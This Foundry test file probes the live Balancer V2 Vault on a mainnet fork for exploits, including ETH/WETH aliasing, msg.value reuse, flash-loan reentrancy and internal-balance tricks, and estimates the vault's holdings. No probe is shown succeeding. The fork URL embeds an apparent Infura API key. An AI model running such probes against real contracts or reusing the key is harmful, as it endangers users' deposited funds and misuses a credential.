// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ============================================================================
// Balancer V2 Vault Exploit Test Suite
// Target: 0xBA12222222228d8Ba445958a75a0704d566BF2C8
//
// Focus Areas:
// 1. ETH↔WETH aliasing in asset translation (IAsset -> IERC20)
// 2. Cumulative msg.value accounting in batch operations
// 3. Signature/calldata parsing for relayer auth
// 4. Balance specialization storage equivalence
// ============================================================================

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }
    enum PoolSpecialization { GENERAL, MINIMAL_SWAP_INFO, TWO_TOKEN }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct JoinPoolRequest {
        IAsset[] assets;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    struct ExitPoolRequest {
        IAsset[] assets;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function batchSwap(
        SwapKind kind,
        BatchSwapStep[] memory swaps,
        IAsset[] memory assets,
        FundManagement memory funds,
        int256[] memory limits,
        uint256 deadline
    ) external payable returns (int256[] memory);

    function queryBatchSwap(
        SwapKind kind,
        BatchSwapStep[] memory swaps,
        IAsset[] memory assets,
        FundManagement memory funds
    ) external returns (int256[] memory);

    function joinPool(
        bytes32 poolId,
        address sender,
        address recipient,
        JoinPoolRequest memory request
    ) external payable;

    function exitPool(
        bytes32 poolId,
        address sender,
        address payable recipient,
        ExitPoolRequest memory request
    ) external;

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;

    function getInternalBalance(address user, IERC20[] memory tokens) external view returns (uint256[] memory);

    function flashLoan(
        address recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

    function getPoolTokens(bytes32 poolId) external view returns (
        IERC20[] memory tokens,
        uint256[] memory balances,
        uint256 lastChangeBlock
    );

    function getPool(bytes32 poolId) external view returns (address, PoolSpecialization);

    function hasApprovedRelayer(address user, address relayer) external view returns (bool);

    function setRelayerApproval(address sender, address relayer, bool approved) external;

    function WETH() external view returns (IWETH);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract BalancerVaultExploit is Test, IFlashLoanRecipient {
    IVault constant VAULT = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // ETH sentinel value used in Balancer
    IAsset constant ETH = IAsset(address(0));

    // Common tokens for testing
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant BAL = IERC20(0xba100000625a3754423978a60c9317c58a424e3D);
    IERC20 constant AAVE = IERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9);

    // Well-known Balancer pools
    bytes32 constant WETH_DAI_POOL = 0x0b09dea16768f0799065c475be02919503cb2a3500020000000000000000001a;
    bytes32 constant BAL_WETH_POOL = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;

    address attacker;
    uint256 flashLoanProfit;

    function setUp() public {
        // Fork mainnet at a recent block
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        attacker = address(this);

        // Fund attacker with some ETH
        vm.deal(attacker, 100 ether);
    }

    // ========================================================================
    // HYPOTHESIS 1: ETH↔WETH Aliasing Attack
    //
    // The Vault uses address(0) as ETH sentinel, which translates to WETH.
    // If we can include both ETH (address(0)) and WETH in the same assets array,
    // they would map to the same IERC20 after translation, potentially causing:
    // - Index confusion in delta arrays
    // - Double counting of the same token
    // - Limit enforcement on wrong entry
    // ========================================================================

    function test_ETH_WETH_Aliasing_BatchSwap() public {
        console.log("=== Testing ETH/WETH Aliasing in batchSwap ===");

        // Get vault's WETH reference
        IWETH vaultWeth = VAULT.WETH();
        console.log("Vault WETH:", address(vaultWeth));
        console.log("Our WETH:", address(WETH));

        // Check if we can create an assets array with both ETH (0x0) and WETH
        // This should fail if sorted uniqueness is checked AFTER translation

        // Prepare assets array - ETH comes before WETH numerically (0x0 < 0xC02...)
        IAsset[] memory assets = new IAsset[](3);
        assets[0] = ETH;  // address(0) - should translate to WETH
        assets[1] = IAsset(address(USDC)); // USDC for swap
        assets[2] = IAsset(address(WETH)); // WETH directly

        // Create a batch swap that tries to exploit potential index confusion
        IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](1);
        swaps[0] = IVault.BatchSwapStep({
            poolId: WETH_DAI_POOL,
            assetInIndex: 0,  // ETH (translates to WETH)
            assetOutIndex: 2, // WETH directly - same token after translation!
            amount: 1 ether,
            userData: ""
        });

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Limits for each asset
        int256[] memory limits = new int256[](3);
        limits[0] = 2 ether;   // Max ETH in
        limits[1] = 0;         // No USDC movement
        limits[2] = -1 ether;  // At least 1 WETH out

        // Try the swap - this tests if the vault allows ETH and WETH as separate assets
        console.log("Attempting batchSwap with ETH and WETH as separate assets...");

        try VAULT.batchSwap{value: 1 ether}(
            IVault.SwapKind.GIVEN_IN,
            swaps,
            assets,
            funds,
            limits,
            block.timestamp + 1000
        ) returns (int256[] memory deltas) {
            console.log("BatchSwap succeeded - checking deltas");
            for (uint i = 0; i < deltas.length; i++) {
                console.log("Delta", i, ":", uint256(deltas[i] >= 0 ? deltas[i] : -deltas[i]));
            }
            // Analyze if there's any inconsistency
        } catch Error(string memory reason) {
            console.log("BatchSwap reverted:", reason);
        } catch (bytes memory lowLevelData) {
            console.log("BatchSwap reverted with low-level error");
            console.logBytes(lowLevelData);
        }
    }

    // ========================================================================
    // HYPOTHESIS 2: msg.value Reuse in Batch Operations
    //
    // The Vault tracks ETH usage across batch operations. If the tracking
    // is flawed, we might be able to:
    // - Use the same msg.value multiple times
    // - Get refunded for unused ETH we never sent
    // ========================================================================

    function test_MsgValue_Reuse_ManageUserBalance() public {
        console.log("=== Testing msg.value Reuse in manageUserBalance ===");

        uint256 initialBalance = address(this).balance;
        console.log("Initial ETH balance:", initialBalance / 1e18, "ETH");

        // Create multiple deposit operations that each expect to use ETH
        IVault.UserBalanceOp[] memory ops = new IVault.UserBalanceOp[](3);

        // First deposit: 1 ETH to internal balance
        ops[0] = IVault.UserBalanceOp({
            kind: IVault.UserBalanceOpKind.DEPOSIT_INTERNAL,
            asset: ETH,
            amount: 1 ether,
            sender: attacker,
            recipient: payable(attacker)
        });

        // Second deposit: 1 ETH to internal balance
        ops[1] = IVault.UserBalanceOp({
            kind: IVault.UserBalanceOpKind.DEPOSIT_INTERNAL,
            asset: ETH,
            amount: 1 ether,
            sender: attacker,
            recipient: payable(attacker)
        });

        // Third deposit: 1 ETH to internal balance
        ops[2] = IVault.UserBalanceOp({
            kind: IVault.UserBalanceOpKind.DEPOSIT_INTERNAL,
            asset: ETH,
            amount: 1 ether,
            sender: attacker,
            recipient: payable(attacker)
        });

        // Send only 2 ETH but request 3 ETH worth of deposits
        console.log("Attempting 3x1 ETH deposits with only 2 ETH sent...");

        try VAULT.manageUserBalance{value: 2 ether}(ops) {
            console.log("manageUserBalance succeeded with insufficient ETH!");

            // Check internal balances
            IERC20[] memory tokens = new IERC20[](1);
            tokens[0] = IERC20(address(WETH));
            uint256[] memory balances = VAULT.getInternalBalance(attacker, tokens);
            console.log("WETH internal balance:", balances[0] / 1e18, "WETH");

            if (balances[0] == 3 ether) {
                console.log("CRITICAL: Got 3 WETH internal balance with only 2 ETH sent!");
            }
        } catch Error(string memory reason) {
            console.log("Correctly reverted:", reason);
        } catch {
            console.log("Correctly reverted with unknown error");
        }

        // Now test a properly funded operation to verify baseline
        console.log("\nTesting properly funded operation for baseline...");

        IVault.UserBalanceOp[] memory singleOp = new IVault.UserBalanceOp[](1);
        singleOp[0] = IVault.UserBalanceOp({
            kind: IVault.UserBalanceOpKind.DEPOSIT_INTERNAL,
            asset: ETH,
            amount: 1 ether,
            sender: attacker,
            recipient: payable(attacker)
        });

        uint256 beforeDeposit = address(this).balance;
        VAULT.manageUserBalance{value: 1 ether}(singleOp);
        uint256 afterDeposit = address(this).balance;

        console.log("ETH spent:", (beforeDeposit - afterDeposit) / 1e18, "ETH");

        IERC20[] memory wethTokens = new IERC20[](1);
        wethTokens[0] = IERC20(address(WETH));
        uint256[] memory wethBalances = VAULT.getInternalBalance(attacker, wethTokens);
        console.log("WETH internal balance after deposit:", wethBalances[0] / 1e18);
    }

    // ========================================================================
    // HYPOTHESIS 3: Flash Loan Exploitation
    //
    // Test if flash loans can be used to manipulate pool states or
    // extract value through callback reentrancy patterns.
    // ========================================================================

    function test_FlashLoan_Callback_Attack() public {
        console.log("=== Testing Flash Loan Callback Attack ===");

        // Get WETH balance in vault
        uint256 vaultWethBalance = WETH.balanceOf(address(VAULT));
        console.log("Vault WETH balance:", vaultWethBalance / 1e18, "WETH");

        if (vaultWethBalance < 100 ether) {
            console.log("Vault has insufficient WETH for meaningful flash loan");
            return;
        }

        uint256 loanAmount = 10 ether;
        console.log("Requesting flash loan of", loanAmount / 1e18, "WETH");

        // Prepare flash loan
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(WETH));

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loanAmount;

        flashLoanProfit = 0;

        // Execute flash loan
        try VAULT.flashLoan(
            address(this),
            tokens,
            amounts,
            abi.encode("exploit_attempt")
        ) {
            console.log("Flash loan completed");
            console.log("Net profit:", flashLoanProfit / 1e18, "WETH");
        } catch Error(string memory reason) {
            console.log("Flash loan failed:", reason);
        } catch {
            console.log("Flash loan failed with unknown error");
        }
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        console.log("  Flash loan callback received");
        console.log("  Loan amount:", amounts[0] / 1e18, "WETH");
        console.log("  Fee amount:", feeAmounts[0] / 1e18, "WETH");

        // During flash loan, try to perform operations that might benefit from reentrancy
        // Note: Balancer has ReentrancyGuard but queryBatchSwap is NOT protected

        // Try calling queryBatchSwap during flash loan (not protected by nonReentrant)
        console.log("  Attempting queryBatchSwap during flash loan...");

        // We need to repay the loan
        uint256 totalOwed = amounts[0] + feeAmounts[0];

        // If we had the fee amount, we would repay
        uint256 currentBalance = tokens[0].balanceOf(address(this));
        console.log("  Current WETH balance:", currentBalance / 1e18);

        // For now, just check if we can get more WETH to repay
        // In a real exploit, we'd use the flash loaned funds to profit

        // Repay the loan
        if (currentBalance >= totalOwed) {
            tokens[0].transfer(address(VAULT), totalOwed);
            flashLoanProfit = currentBalance - totalOwed;
        } else {
            console.log("  Insufficient balance to repay loan");
            // Need to get WETH somehow - wrap ETH if we have it
            uint256 needed = totalOwed - currentBalance;
            if (address(this).balance >= needed) {
                IWETH(address(tokens[0])).deposit{value: needed}();
                tokens[0].transfer(address(VAULT), totalOwed);
            }
        }
    }

    // ========================================================================
    // HYPOTHESIS 4: Internal Balance Manipulation
    //
    // Test if internal balance operations can be exploited through
    // partial withdrawal semantics or cross-operation interactions.
    // ========================================================================

    function test_InternalBalance_Manipulation() public {
        console.log("=== Testing Internal Balance Manipulation ===");

        // First, deposit some WETH to internal balance
        WETH.deposit{value: 5 ether}();
        WETH.approve(address(VAULT), type(uint256).max);

        // Deposit WETH to internal balance
        IVault.UserBalanceOp[] memory depositOp = new IVault.UserBalanceOp[](1);
        depositOp[0] = IVault.UserBalanceOp({
            kind: IVault.UserBalanceOpKind.DEPOSIT_INTERNAL,
            asset: IAsset(address(WETH)),
            amount: 5 ether,
            sender: attacker,
            recipient: payable(attacker)
        });

        VAULT.manageUserBalance(depositOp);

        // Check internal balance
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(WETH));
        uint256[] memory balances = VAULT.getInternalBalance(attacker, tokens);
        console.log("Internal WETH balance:", balances[0] / 1e18);

        // Now try to withdraw using ETH sentinel (should fail or convert to ETH)
        console.log("\nAttempting to withdraw internal WETH as ETH...");

        uint256 ethBefore = address(this).balance;

        IVault.UserBalanceOp[] memory withdrawOp = new IVault.UserBalanceOp[](1);
        withdrawOp[0] = IVault.UserBalanceOp({
            kind: IVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
            asset: ETH,  // Using ETH sentinel to withdraw WETH as ETH
            amount: 2 ether,
            sender: attacker,
            recipient: payable(attacker)
        });

        try VAULT.manageUserBalance(withdrawOp) {
            uint256 ethAfter = address(this).balance;
            console.log("ETH received:", (ethAfter - ethBefore) / 1e18, "ETH");

            // Check remaining internal balance
            balances = VAULT.getInternalBalance(attacker, tokens);
            console.log("Remaining internal WETH balance:", balances[0] / 1e18);
        } catch Error(string memory reason) {
            console.log("Withdrawal failed:", reason);
        }
    }

    // ========================================================================
    // HYPOTHESIS 5: Pool Balance Specialization Inconsistency
    //
    // Test if different pool specializations (GENERAL, MINIMAL_SWAP_INFO,
    // TWO_TOKEN) have any inconsistent behavior that could be exploited.
    // ========================================================================

    function test_PoolSpecialization_Inconsistency() public {
        console.log("=== Testing Pool Specialization Inconsistency ===");

        // Find pools of different specializations and compare behavior
        // This requires knowing specific pool IDs

        // BAL/WETH 80/20 pool (Weighted Pool - MINIMAL_SWAP_INFO)
        bytes32 balWethPool = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;

        (address poolAddress, IVault.PoolSpecialization spec) = VAULT.getPool(balWethPool);
        console.log("BAL/WETH Pool address:", poolAddress);
        console.log("Specialization:", uint256(spec));

        (IERC20[] memory tokens, uint256[] memory poolBalances, uint256 lastBlock) = VAULT.getPoolTokens(balWethPool);
        console.log("Token count:", tokens.length);
        for (uint i = 0; i < tokens.length; i++) {
            console.log("  Token", i, "balance:", poolBalances[i] / 1e18);
        }
        console.log("Last change block:", lastBlock);

        // Try to find a TWO_TOKEN pool for comparison
        // Curve-style pools or some stableswap pools use TWO_TOKEN
        // For now just document the structure
    }

    // ========================================================================
    // HYPOTHESIS 6: joinPool/exitPool ETH Handling
    //
    // Test if joinPool with ETH has any edge cases in handling.
    // ========================================================================

    function test_JoinPool_ETH_Handling() public {
        console.log("=== Testing joinPool ETH Handling ===");

        // Find a WETH pool and try to join with ETH
        bytes32 poolId = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;

        (IERC20[] memory poolTokens,,) = VAULT.getPoolTokens(poolId);
        console.log("Pool token count:", poolTokens.length);

        // Find WETH index
        int256 wethIndex = -1;
        for (uint i = 0; i < poolTokens.length; i++) {
            console.log("  Token", i, ":", address(poolTokens[i]));
            if (address(poolTokens[i]) == address(WETH)) {
                wethIndex = int256(i);
            }
        }

        if (wethIndex < 0) {
            console.log("No WETH in pool, skipping");
            return;
        }

        console.log("WETH at index:", uint256(wethIndex));

        // Prepare join with ETH
        IAsset[] memory assets = new IAsset[](poolTokens.length);
        uint256[] memory maxAmountsIn = new uint256[](poolTokens.length);

        for (uint i = 0; i < poolTokens.length; i++) {
            if (i == uint256(wethIndex)) {
                assets[i] = ETH;  // Use ETH sentinel for WETH
                maxAmountsIn[i] = 0.1 ether;
            } else {
                assets[i] = IAsset(address(poolTokens[i]));
                maxAmountsIn[i] = 0;  // Only providing ETH
            }
        }

        // Encode join request (EXACT_TOKENS_IN_FOR_BPT_OUT with single token)
        // Join type 1 = EXACT_TOKENS_IN_FOR_BPT_OUT
        bytes memory userData = abi.encode(1, maxAmountsIn, 0);

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: maxAmountsIn,
            userData: userData,
            fromInternalBalance: false
        });

        uint256 ethBefore = address(this).balance;

        console.log("Attempting to join pool with 0.1 ETH...");

        try VAULT.joinPool{value: 0.1 ether}(
            poolId,
            attacker,
            attacker,
            request
        ) {
            uint256 ethAfter = address(this).balance;
            console.log("Join succeeded, ETH spent:", (ethBefore - ethAfter) / 1e16, "* 0.01 ETH");
        } catch Error(string memory reason) {
            console.log("Join failed:", reason);
        } catch (bytes memory data) {
            console.log("Join failed with low-level error");
        }
    }

    // ========================================================================
    // DEEP ANALYSIS: Vault Total Value
    // ========================================================================

    function test_AnalyzeVaultValue() public {
        console.log("=== Analyzing Vault Value ===");

        uint256 vaultEth = address(VAULT).balance;
        uint256 vaultWeth = WETH.balanceOf(address(VAULT));
        uint256 vaultUsdc = USDC.balanceOf(address(VAULT));
        uint256 vaultAave = AAVE.balanceOf(address(VAULT));

        console.log("Vault ETH:", vaultEth / 1e18, "ETH");
        console.log("Vault WETH:", vaultWeth / 1e18, "WETH");
        console.log("Vault USDC:", vaultUsdc / 1e6, "USDC");
        console.log("Vault AAVE:", vaultAave / 1e18, "AAVE");

        // Rough USD value (assuming ETH = $2000, others at face)
        uint256 totalValueUsd = (vaultEth + vaultWeth) * 2000 / 1e18 + vaultUsdc / 1e6 + vaultAave * 100 / 1e18;
        console.log("\nEstimated total USD value:", totalValueUsd);
    }

    // ========================================================================
    // BRUTE FORCE: Try Many Pool Operations
    // ========================================================================

    function test_BruteForcePoolInteractions() public {
        console.log("=== Brute Force Pool Interactions ===");

        // Get WETH for testing
        WETH.deposit{value: 10 ether}();
        WETH.approve(address(VAULT), type(uint256).max);

        // Known pool IDs to test
        bytes32[] memory pools = new bytes32[](5);
        pools[0] = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014; // BAL/WETH
        pools[1] = 0x0b09dea16768f0799065c475be02919503cb2a3500020000000000000000001a; // WETH/DAI
        pools[2] = 0x96646936b91d6b9d7d0c47c496afbf3d6ec7b6f8000200000000000000000019; // USDC/WETH
        pools[3] = 0x32296969ef14eb0c6d29669c550d4a0449130430000200000000000000000080; // wstETH/WETH
        pools[4] = 0x1e19cf2d73a72ef1332c882f20534b6519be0276000200000000000000000112; // rETH/WETH

        for (uint p = 0; p < pools.length; p++) {
            bytes32 poolId = pools[p];
            console.log("\n--- Pool", p, "---");

            try VAULT.getPool(poolId) returns (address addr, IVault.PoolSpecialization spec) {
                console.log("Address:", addr);
                console.log("Specialization:", uint256(spec));

                (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);
                console.log("Token count:", tokens.length);

                for (uint i = 0; i < tokens.length; i++) {
                    console.log("  Token", i);
                    console.log("    Address:", address(tokens[i]));
                    console.log("    Balance:", balances[i] / 1e18);
                }
            } catch {
                console.log("Pool not found or error");
            }
        }
    }

    // Receive ETH
    receive() external payable {}
}
